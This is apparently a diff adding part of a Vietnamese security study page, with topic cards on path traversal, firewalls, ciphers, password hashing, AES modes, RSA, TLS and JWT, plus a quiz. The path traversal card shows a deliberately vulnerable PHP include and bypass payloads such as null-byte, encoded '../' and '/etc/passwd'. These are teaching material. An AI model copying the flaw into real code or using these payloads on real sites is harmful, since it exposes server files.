+                                <div><h3 class="text-lg font-bold text-indigo-700 mb-3">Ví dụ Mã nguồn</h3><div class="mb-4"><span class="text-xs font-bold text-red-600 uppercase">Code Lỗi</span><pre class="bg-slate-800 text-red-300 p-3 rounded text-xs overflow-x-auto mt-1">$file = $_GET['file'];
+include("pages/" . $file);</pre></div><div><span class="text-xs font-bold text-green-600 uppercase">Code An toàn</span><pre class="bg-slate-800 text-green-300 p-3 rounded text-xs overflow-x-auto mt-1">$file = $_GET['file'];
+$clean_file = basename($file);
+include("pages/" . $clean_file);</pre></div></div>
+                            </div>
+                            <div class="bg-yellow-50 p-5 rounded-lg border border-yellow-200"><h3 class="font-bold text-yellow-800 mb-2">Biến thể</h3><div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm"><div><strong class="block text-slate-700">Null Byte</strong><p class="text-slate-600">secret.txt%00.php</p></div><div><strong class="block text-slate-700">Encoding Bypass</strong><p class="text-slate-600">%2e%2e%2f</p></div><div><strong class="block text-slate-700">Absolute Path</strong><p class="text-slate-600">/etc/passwd</p></div><div><strong class="block text-slate-700">Nested Traversal</strong><p class="text-slate-600">....//</p></div></div></div>
+                            <div class="text-center pt-6"><button data-topic="topic-8" class="start-quiz-btn bg-gradient-to-r from-yellow-500 to-orange-500 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Traversal</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-blue-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>9. Firewall & IDS/IPS <span class="ml-2 text-xs bg-blue-100 text-blue-800 px-2 py-1 rounded border border-blue-200">V4</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
+                                <div><h3 class="text-lg font-bold text-indigo-700 mb-3">Firewall</h3><ul class="space-y-2 text-sm"><li class="bg-white p-2 rounded border border-slate-200"><strong class="text-blue-700">Packet Filtering:</strong> Lọc theo IP/Port.</li><li class="bg-white p-2 rounded border border-slate-200"><strong class="text-blue-700">Stateful Inspection:</strong> Theo dõi trạng thái kết nối.</li><li class="bg-white p-2 rounded border border-slate-200"><strong class="text-blue-700">WAF:</strong> Chặn SQLi, XSS.</li></ul></div>
+                                <div><h3 class="text-lg font-bold text-indigo-700 mb-3">IDS & IPS</h3><ul class="space-y-2 text-sm"><li class="bg-white p-2 rounded border border-slate-200"><strong class="text-red-700">IDS:</strong> Phát hiện, cảnh báo.</li><li class="bg-white p-2 rounded border border-slate-200"><strong class="text-red-700">IPS:</strong> Ngăn chặn tự động.</li></ul></div>
+                            </div>
+                            <div class="bg-slate-800 text-slate-200 p-4 rounded-lg font-mono text-sm mb-6"><p class="text-slate-400 border-b border-slate-600 pb-2 mb-2">Ví dụ cấu hình</p><div class="space-y-1"><p><span class="text-green-400">ALLOW</span> TCP FROM 192.168.1.0/24 TO ANY PORT 80</p><p><span class="text-red-400">DENY</span> TCP FROM ANY TO ANY PORT 22</p><p><span class="text-green-400">ALLOW</span> ESTABLISHED,RELATED</p></div></div>
+                            <div class="bg-blue-50 p-5 rounded-lg border border-blue-100"><h3 class="font-bold text-blue-800 mb-2">Phương pháp phát hiện</h3><div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm"><div><strong class="block text-indigo-700">Signature-based</strong><p class="text-slate-600">Khớp mẫu tấn công.</p></div><div><strong class="block text-indigo-700">Anomaly-based</strong><p class="text-slate-600">Cảnh báo bất thường.</p></div></div></div>
+                            <div class="text-center pt-6"><button data-topic="topic-9" class="start-quiz-btn bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Firewall/IDS</button></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="section-2" class="mb-16">
+            <div class="flex items-center mb-6 border-b-2 border-indigo-200 pb-2">
+                <span class="text-4xl mr-3">🔐</span>
+                <h2 class="text-3xl font-bold text-slate-800">Phần 2: Mật mã học (Cryptography)</h2>
+            </div>
+            <div class="space-y-4">
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-indigo-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>10. Traditional Ciphers <span class="ml-2 text-xs bg-indigo-100 text-indigo-800 px-2 py-1 rounded border border-indigo-200">V5</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8"><div><h3 class="text-lg font-bold text-indigo-700 mb-3">Mono-alphabetic</h3><ul class="list-disc list-inside text-sm text-slate-600 space-y-1"><li>Caesar Cipher</li><li>Atbash Cipher</li><li>Điểm yếu: Frequency Analysis</li></ul></div><div><h3 class="text-lg font-bold text-indigo-700 mb-3">Poly-alphabetic</h3><ul class="list-disc list-inside text-sm text-slate-600 space-y-1"><li>Vigenère Cipher</li><li>Ưu điểm: Làm phẳng tần suất</li></ul></div></div><div class="bg-indigo-50 p-5 rounded-lg border border-indigo-100 mb-6"><h3 class="font-bold text-indigo-800 mb-2">One-Time Pad</h3><ol class="list-decimal list-inside text-sm text-slate-600 mt-2 space-y-1"><li>Khóa ngẫu nhiên</li><li>Dài bằng bản rõ</li><li>Không dùng lại</li></ol></div><div class="text-center pt-4"><button data-topic="topic-10" class="start-quiz-btn bg-gradient-to-r from-indigo-600 to-blue-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Topic 10</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-teal-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>11. Transposition Ciphers <span class="ml-2 text-xs bg-teal-100 text-teal-800 px-2 py-1 rounded border border-teal-200">V5</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="mb-6"><h3 class="text-lg font-bold text-indigo-700 mb-2">Nguyên lý</h3><p class="text-slate-700 text-justify mb-4">Giữ nguyên ký tự, thay đổi vị trí.</p><div class="bg-white p-4 rounded border border-slate-200 shadow-sm"><p class="text-sm font-mono">Plaintext: SECURITY</p><p class="text-sm font-mono mt-1">Ciphertext: ETYRCIUS</p></div></div><div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6"><div class="bg-teal-50 p-4 rounded-lg border border-teal-100"><h4 class="font-bold text-teal-800 mb-2">Rail Fence Cipher</h4><div class="bg-white p-2 rounded font-mono text-xs">H . . . O . . . L<br>. E . L . W . R . D</div></div><div class="bg-teal-50 p-4 rounded-lg border border-teal-100"><h4 class="font-bold text-teal-800 mb-2">Columnar Transposition</h4><div class="bg-white p-2 rounded font-mono text-xs">Keyword: 3 1 4 2<br>T E A M<br>W O R K</div></div></div><div class="text-center pt-4"><button data-topic="topic-11" class="start-quiz-btn bg-gradient-to-r from-teal-600 to-emerald-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Topic 11</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-purple-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>12. Cryptographic Hashes <span class="ml-2 text-xs bg-purple-100 text-purple-800 px-2 py-1 rounded border border-purple-200">V5</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="mb-6"><h3 class="text-lg font-bold text-indigo-700 mb-2">Định nghĩa & Tính chất</h3><ul class="space-y-2 text-sm text-slate-700"><li><strong>Một chiều</strong></li><li><strong>Avalanche Effect</strong></li><li><strong>Collision Resistance</strong></li></ul></div><div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6"><div class="bg-red-50 p-4 rounded border border-red-200"><h4 class="font-bold text-red-800 mb-1">MD5</h4><p class="text-xs text-red-700">Không an toàn.</p></div><div class="bg-green-50 p-4 rounded border border-green-200"><h4 class="font-bold text-green-800 mb-1">SHA-256</h4><p class="text-xs text-green-700">Tiêu chuẩn công nghiệp.</p></div></div><div class="bg-slate-800 text-slate-300 p-4 rounded-lg text-sm font-mono"><p class="mb-2 border-b border-slate-600 pb-1">Salting</p><div class="space-y-1"><p><span class="text-red-400">Weak:</span> hash("password123")</p><p><span class="text-green-400">Strong:</span> hash("password123" + "RandomSalt")</p></div></div><div class="text-center pt-6"><button data-topic="topic-12" class="start-quiz-btn bg-gradient-to-r from-purple-600 to-pink-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Topic 12</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-cyan-600">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>13. MAC & HMAC <span class="ml-2 text-xs bg-cyan-100 text-cyan-800 px-2 py-1 rounded border border-cyan-200">V6</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8"><div><h3 class="text-lg font-bold text-indigo-700 mb-3">MAC</h3><div class="bg-white p-3 rounded border border-slate-200 shadow-sm text-sm"><p><strong>Integrity</strong> và <strong>Authentication</strong></p></div></div><div><h3 class="text-lg font-bold text-indigo-700 mb-3">HMAC</h3><div class="bg-slate-800 text-slate-300 p-3 rounded font-mono text-xs overflow-x-auto"><p>HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))</p></div></div></div><div class="bg-yellow-50 p-4 rounded-lg border border-yellow-200 mb-6"><h4 class="font-bold text-yellow-800 mb-1">Vì sao không Hash(Key+Message)?</h4><p class="text-sm text-slate-700">Dễ bị length extension.</p></div><div class="text-center pt-4"><button data-topic="topic-13" class="start-quiz-btn bg-gradient-to-r from-cyan-600 to-blue-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập HMAC</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-pink-600">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>14. Yescrypt <span class="ml-2 text-xs bg-pink-100 text-pink-800 px-2 py-1 rounded border border-pink-200">V6</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="mb-6"><h3 class="text-lg font-bold text-indigo-700 mb-2">Tại sao cần Yescrypt?</h3><ul class="space-y-2 text-sm text-slate-700"><li><strong>Memory-Hard</strong></li><li><strong>Scrypt-based</strong></li><li><strong>Linux Standard</strong></li></ul></div><div class="bg-slate-800 text-slate-300 p-4 rounded-lg text-sm font-mono overflow-x-auto"><p class="mb-2 border-b border-slate-600 pb-1">Chuỗi Yescrypt trong /etc/shadow</p><p><span class="text-yellow-400">$y$</span><span class="text-blue-400">j9T</span><span class="text-green-400">$Salt</span><span class="text-red-400">$Hash</span></p></div><div class="text-center pt-6"><button data-topic="topic-14" class="start-quiz-btn bg-gradient-to-r from-pink-600 to-rose-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Yescrypt</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-orange-600">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>15. bcrypt <span class="ml-2 text-xs bg-orange-100 text-orange-800 px-2 py-1 rounded border border-orange-200">V6</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8"><div><h3 class="text-lg font-bold text-indigo-700 mb-3">Đặc điểm</h3><ul class="list-disc list-inside text-sm text-slate-600 space-y-2"><li>Adaptive Hashing</li><li>Built-in Salt</li><li>Giới hạn 72 ký tự</li></ul></div><div><h3 class="text-lg font-bold text-indigo-700 mb-3">Chuỗi bcrypt</h3><div class="bg-white p-4 rounded border border-slate-300 font-mono text-sm break-all"><span class="text-blue-600 font-bold">$2a$</span><span class="text-red-600 font-bold">12$</span><span class="text-green-600">Salt</span><span class="text-slate-800">Checksum</span></div></div></div><div class="bg-orange-50 p-4 rounded-lg border border-orange-200"><h4 class="font-bold text-orange-900 mb-1">Tại sao "Chậm" lại tốt?</h4><p class="text-sm text-slate-700">Giảm tốc brute-force đáng kể.</p></div><div class="text-center pt-6"><button data-topic="topic-15" class="start-quiz-btn bg-gradient-to-r from-orange-600 to-red-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập bcrypt</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-gray-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>16. DES <span class="ml-2 text-xs bg-gray-200 text-gray-800 px-2 py-1 rounded border border-gray-300">V7</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-6"><div><h3 class="text-lg font-bold text-indigo-700 mb-2">Thông số</h3><ul class="space-y-2 text-sm text-slate-700"><li>Block: 64-bit</li><li>Key: 56-bit</li><li>Feistel</li><li>16 vòng</li></ul></div><div><h3 class="text-lg font-bold text-indigo-700 mb-2">Tại sao chết?</h3><p class="text-slate-700 text-sm text-justify">2^56 khóa quá nhỏ, brute-force khả thi.</p><div class="mt-2 bg-red-50 p-3 rounded border border-red-200"><strong class="text-red-800 text-xs">Trạng thái:</strong><span class="text-xs text-red-700">Không an toàn.</span></div></div></div><div class="bg-slate-800 text-slate-300 p-4 rounded-lg text-sm font-mono mb-6"><p class="text-green-400 mb-2">Feistel Network</p><p>L[i] = R[i-1]</p><p>R[i] = L[i-1] XOR F(R[i-1], Key[i])</p></div><div class="text-center pt-4"><button data-topic="topic-16" class="start-quiz-btn bg-gradient-to-r from-gray-600 to-slate-700 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập DES</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-green-600">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>17. AES <span class="ml-2 text-xs bg-green-100 text-green-800 px-2 py-1 rounded border border-green-200">V7</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="mb-6"><h3 class="text-lg font-bold text-indigo-700 mb-2">Tổng quan</h3><p class="text-slate-700 text-justify mb-3">Tiêu chuẩn mã hóa hiện nay (Rijndael), cấu trúc SPN.</p><div class="grid grid-cols-1 sm:grid-cols-3 gap-4 text-center"><div class="bg-white p-3 rounded shadow-sm border"><strong class="block text-green-700">Block Size</strong><span class="text-slate-600 text-sm">128-bit</span></div><div class="bg-white p-3 rounded shadow-sm border"><strong class="block text-green-700">Key Size</strong><span class="text-slate-600 text-sm">128/192/256</span></div><div class="bg-white p-3 rounded shadow-sm border"><strong class="block text-green-700">Rounds</strong><span class="text-slate-600 text-sm">10/12/14</span></div></div></div><div class="bg-green-50 p-5 rounded-lg border border-green-200 mb-6"><h4 class="font-bold text-green-800 mb-2">Bốn bước một vòng</h4><ol class="list-decimal list-inside text-sm text-slate-700 space-y-2"><li>SubBytes</li><li>ShiftRows</li><li>MixColumns</li><li>AddRoundKey</li></ol></div><div class="text-center pt-4"><button data-topic="topic-17" class="start-quiz-btn bg-gradient-to-r from-green-600 to-teal-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập AES</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-blue-600">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>18. Block Cipher Modes <span class="ml-2 text-xs bg-blue-100 text-blue-800 px-2 py-1 rounded border border-blue-200">V7</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="space-y-6"><div><h3 class="text-lg font-bold text-indigo-700 mb-2">Tại sao cần Mode?</h3><p class="text-slate-700 text-sm">Áp dụng AES cho dữ liệu dài.</p></div><div class="grid grid-cols-1 lg:grid-cols-2 gap-6"><div class="bg-red-50 p-4 rounded border border-red-200"><h4 class="font-bold text-red-800">ECB</h4><p class="text-xs text-red-700 mt-1">Khối giống nhau ra mã giống nhau.</p><p class="text-xs font-bold mt-2 text-red-800">Không an toàn.</p></div><div class="bg-yellow-50 p-4 rounded border border-yellow-200"><h4 class="font-bold text-yellow-800">CBC</h4><p class="text-xs text-yellow-900 mt-1">XOR với khối mã trước, cần IV.</p><p class="text-xs font-bold mt-2 text-yellow-800">An toàn, chậm.</p></div><div class="bg-blue-50 p-4 rounded border border-blue-200"><h4 class="font-bold text-blue-800">CTR</h4><p class="text-xs text-blue-900 mt-1">Mã hóa bộ đếm, XOR với dữ liệu.</p><p class="text-xs font-bold mt-2 text-blue-800">Nhanh, song song.</p></div><div class="bg-green-50 p-4 rounded border border-green-200"><h4 class="font-bold text-green-800">GCM</h4><p class="text-xs text-green-900 mt-1">CTR + Authentication.</p><p class="text-xs font-bold mt-2 text-green-800">Tốt nhất hiện nay.</p></div></div></div><div class="text-center pt-6"><button data-topic="topic-18" class="start-quiz-btn bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Modes</button></div></div></div>
+                </div>
+            </div>
+        </section>
+
+        <section id="section-3" class="mb-16">
+            <div class="flex items-center mb-6 border-b-2 border-indigo-200 pb-2">
+                <span class="text-4xl mr-3">🔗</span>
+                <h2 class="text-3xl font-bold text-slate-800">Phần 3: Giao thức & Ứng dụng</h2>
+            </div>
+            <div class="space-y-4">
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-purple-600">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>19. RSA & PKI <span class="ml-2 text-xs bg-purple-100 text-purple-800 px-2 py-1 rounded border border-purple-200">V8</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8"><div><h3 class="text-lg font-bold text-indigo-700 mb-3">Nguyên lý RSA</h3><div class="bg-slate-800 text-slate-300 p-3 rounded font-mono text-xs"><p>1. Chọn p, q</p><p>2. n = p * q</p><p>3. Phi(n) = (p-1)(q-1)</p><p>4. Chọn e</p><p>5. Tính d: (d*e) mod Phi(n) = 1</p><p class="text-green-400 mt-1">Public: (e, n)</p><p class="text-red-400">Private: (d, n)</p></div></div><div><h3 class="text-lg font-bold text-indigo-700 mb-3">PKI</h3><ul class="space-y-2 text-sm text-slate-600"><li>CA</li><li>Digital Certificate</li><li>Chain of Trust</li></ul></div></div><div class="bg-purple-50 p-4 rounded-lg border border-purple-200 mb-6"><h4 class="font-bold text-purple-900 mb-1">Quy tắc vàng</h4><ul class="list-disc list-inside text-sm text-slate-700"><li>Mã hóa: Public Key người nhận</li><li>Chữ ký số: Private Key người gửi</li></ul></div><div class="text-center pt-4"><button data-topic="topic-19" class="start-quiz-btn bg-gradient-to-r from-purple-600 to-indigo-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập RSA & PKI</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-blue-600">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>20. Diffie-Hellman & HTTPS <span class="ml-2 text-xs bg-blue-100 text-blue-800 px-2 py-1 rounded border border-blue-200">V8</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="mb-6"><h3 class="text-lg font-bold text-indigo-700 mb-2">Diffie-Hellman</h3><p class="text-slate-700 text-sm text-justify mb-3">Tạo shared secret qua kênh không an toàn, dựa trên logarit rời rạc.</p></div><div class="bg-white p-5 rounded-lg border border-slate-200 shadow-sm mb-6"><h3 class="text-lg font-bold text-indigo-700 mb-3">HTTPS (TLS Handshake)</h3><ol class="relative border-l border-indigo-200 ml-3 space-y-4"><li class="mb-2 ml-6"><span class="absolute flex items-center justify-center w-6 h-6 bg-blue-100 rounded-full -left-3 ring-4 ring-white text-blue-600 font-bold text-xs">1</span><h4 class="font-bold text-sm">Client Hello</h4><p class="text-xs text-slate-500">Cipher Suites + Random1</p></li><li class="mb-2 ml-6"><span class="absolute flex items-center justify-center w-6 h-6 bg-blue-100 rounded-full -left-3 ring-4 ring-white text-blue-600 font-bold text-xs">2</span><h4 class="font-bold text-sm">Server Hello + Certificate</h4><p class="text-xs text-slate-500">Chọn thuật toán + Random2 + Cert</p></li><li class="mb-2 ml-6"><span class="absolute flex items-center justify-center w-6 h-6 bg-blue-100 rounded-full -left-3 ring-4 ring-white text-blue-600 font-bold text-xs">3</span><h4 class="font-bold text-sm">Verification & Key Exchange</h4><p class="text-xs text-slate-500">Kiểm tra Cert, thống nhất Pre-master</p></li><li class="mb-2 ml-6"><span class="absolute flex items-center justify-center w-6 h-6 bg-green-100 rounded-full -left-3 ring-4 ring-white text-green-600 font-bold text-xs">4</span><h4 class="font-bold text-sm">Session Key Generation</h4><p class="text-xs text-slate-500">Tạo Session Key cho AES-GCM</p></li></ol></div><div class="text-center pt-4"><button data-topic="topic-20" class="start-quiz-btn bg-gradient-to-r from-blue-600 to-sky-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập DH & HTTPS</button></div></div></div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-yellow-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center"><span>21. JWT (JSON Web Token) <span class="ml-2 text-xs bg-yellow-100 text-yellow-800 px-2 py-1 rounded border border-yellow-200">V8</span></span><span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span></button>
+                    <div class="accordion-content bg-slate-50"><div class="p-6 sm:p-8 border-t border-slate-200"><div class="flex flex-col md:flex-row gap-8 mb-6"><div class="md:w-1/2"><h3 class="text-lg font-bold text-indigo-700 mb-3">Cấu trúc JWT</h3><div class="font-mono text-xs break-all bg-white p-3 rounded border border-slate-300"><span class="text-red-500">eyJhbGciOiJIUzI1NiJ9</span>.<span class="text-purple-500">eyJ1c2VyIjoiYWRtaW4ifQ</span>.<span class="text-blue-500">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span></div><ul class="mt-2 space-y-1 text-xs text-slate-600"><li><span class="text-red-500 font-bold">Header:</span> Thuật toán</li><li><span class="text-purple-500 font-bold">Payload:</span> Dữ liệu</li><li><span class="text-blue-500 font-bold">Signature:</span> Chữ ký</li></ul></div><div class="md:w-1/2"><h3 class="text-lg font-bold text-indigo-700 mb-3">Ưu điểm Stateless</h3><p class="text-slate-700 text-sm text-justify">Không cần lưu Session, phù hợp Microservices.</p><div class="mt-4 bg-red-50 p-3 rounded border border-red-200"><strong class="text-red-800 text-xs">Rủi ro bảo mật:</strong><ul class="list-disc list-inside text-xs text-red-700 mt-1"><li>Lộ payload</li><li>Thuật toán none</li><li>Không thể revoke tức thì</li></ul></div></div></div><div class="text-center pt-6"><button data-topic="topic-21" class="start-quiz-btn bg-gradient-to-r from-yellow-500 to-orange-500 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập JWT</button></div></div></div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <div id="json-fallback" class="hidden fixed bottom-4 right-4 bg-yellow-50 border border-yellow-200 p-4 rounded-xl shadow-lg z-40 w-[320px]">
+        <div class="flex items-start gap-3">
+            <div class="text-yellow-500">⚠️</div>
+            <div class="flex-1">
+                <div class="font-bold text-yellow-900">Không tải được JSON qua fetch</div>
+                <div class="text-sm text-yellow-800 mt-1">Chọn tệp JSON thủ công để nạp dữ liệu.</div>
+                <input id="json-file-input" type="file" accept="application/json" class="mt-3 w-full text-sm" />
+            </div>
+        </div>
+    </div>
+
+    <div id="quiz-modal" class="fixed inset-0 bg-indigo-900 bg-opacity-80 backdrop-blur-sm flex items-center justify-center p-0 sm:p-4 z-50 hidden">
+        <div id="quiz-container" class="bg-white sm:rounded-2xl shadow-2xl w-full max-w-3xl h-full sm:h-auto sm:max-h-[90vh] flex flex-col overflow-hidden">
+            <header class="p-5 bg-indigo-600 text-white flex justify-between items-center shadow-md">
+                <div><h2 id="quiz-title" class="text-xl font-bold">Luyện tập</h2><p class="text-indigo-100 text-xs mt-1">Chế độ: 10 câu ngẫu nhiên</p></div>
+                <button id="close-quiz-btn" class="text-indigo-200 hover:text-white transition-colors bg-indigo-700 hover:bg-indigo-500 rounded-full p-2"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg></button>
+            </header>
+            <div class="p-6 sm:p-8 flex-grow overflow-y-auto bg-slate-50">
+                <div class="flex justify-between items-center mb-6 bg-white p-3 rounded-lg shadow-sm border border-slate-200">
+                    <div class="flex items-center gap-2"><span class="text-xs font-bold uppercase text-slate-400 tracking-wide">Tiến độ</span><span id="question-counter" class="text-lg font-bold text-indigo-600">1 / 10</span></div>
+                    <div class="flex items-center gap-2"><span class="text-xs font-bold uppercase text-slate-400 tracking-wide">Điểm số</span><span id="score-display" class="text-lg font-bold text-green-600">0</span></div>
+                </div>
+                <div id="quiz-content"><div class="bg-white p-6 rounded-xl shadow-sm border border-slate-200 mb-6 relative"><span class="absolute top-0 left-0 bg-indigo-100 text-indigo-800 text-xs font-bold px-3 py-1 rounded-br-xl">Câu hỏi</span><p id="question-text" class="text-xl font-medium text-slate-800 mt-4 leading-relaxed">Nội dung câu hỏi...</p></div><div id="answer-options" class="grid grid-cols-1 gap-3"></div><div id="feedback-area" class="hidden mt-6"></div></div>
+                <div id="quiz-results" class="hidden text-center py-10"><div class="inline-block p-4 rounded-full bg-indigo-100 text-indigo-600 mb-4"><svg class="w-16 h-16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><h3 class="text-3xl font-bold text-slate-800 mb-2">Hoàn thành!</h3><p class="text-slate-500 mb-6">Bạn đã hoàn thành bài kiểm tra.</p><div class="text-6xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-indigo-600 to-purple-600 mb-8" id="final-score">0</div><button id="restart-quiz-btn" class="bg-indigo-600 text-white font-bold py-3 px-8 rounded-lg hover:bg-indigo-700 transition-all shadow-lg hover:shadow-indigo-200 transform hover:-translate-y-1">Làm lại chủ đề này</button></div>
+            </div>
+            <footer class="p-4 bg-white border-t border-slate-200 flex justify-end h-20 items-center"><button id="next-question-btn" class="hidden bg-indigo-600 text-white font-bold py-2 px-6 rounded-lg hover:bg-indigo-700 transition-colors flex items-center">Câu tiếp theo <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"></path></svg></button></footer>
+        </div>
+    </div>
+</body>
+</html>
